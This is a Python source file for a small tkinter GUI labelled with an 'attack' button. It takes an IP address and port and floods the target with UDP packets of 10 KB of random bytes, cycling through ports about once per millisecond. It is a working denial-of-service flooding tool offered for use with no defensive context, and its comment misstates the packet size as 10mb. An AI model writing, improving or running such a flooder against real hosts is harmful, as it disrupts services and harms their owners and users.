from tkinter import *
from tkinter.ttk import *
from time import strftime
import socket
import random
from datetime import datetime

port = 0 

def time():
    string = strftime('%H:%M:%S %p')
    lbl.config(text=string)
    lbl.after(1000, time)

def attack():
    global pr
    pr = E1.get()
    ip = pr
    global rt
    rt = E2.get()
    port = int(rt) 

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(10 * 1024) # = 10mb

    def send_request():
        nonlocal port 
        sock.sendto(bytes, (ip, port))
        port = port + 1
        print("Sent request to %s through port: %s" % (ip, port))
        if port == 65534:
            port = 1
        root.after(1, send_request)

    send_request()

root = Tk()
root.geometry("350x200+385+105")
root.resizable(0, 0)

lbl = Label(root, font=('calibri', 20, 'bold'), background='purple', foreground='white')
lbl.pack(anchor='s')
time()

L1 = Label(root, text="ip address")
L1.pack(side=TOP)
E1 = Entry(root)
E1.pack(side=TOP)

L2 = Label(root, text="port")
L2.pack(side=TOP)
E2 = Entry(root)
E2.pack(side=TOP)

button = Button(root, text="attack", command=attack)
button.pack(side=TOP)

root.mainloop()
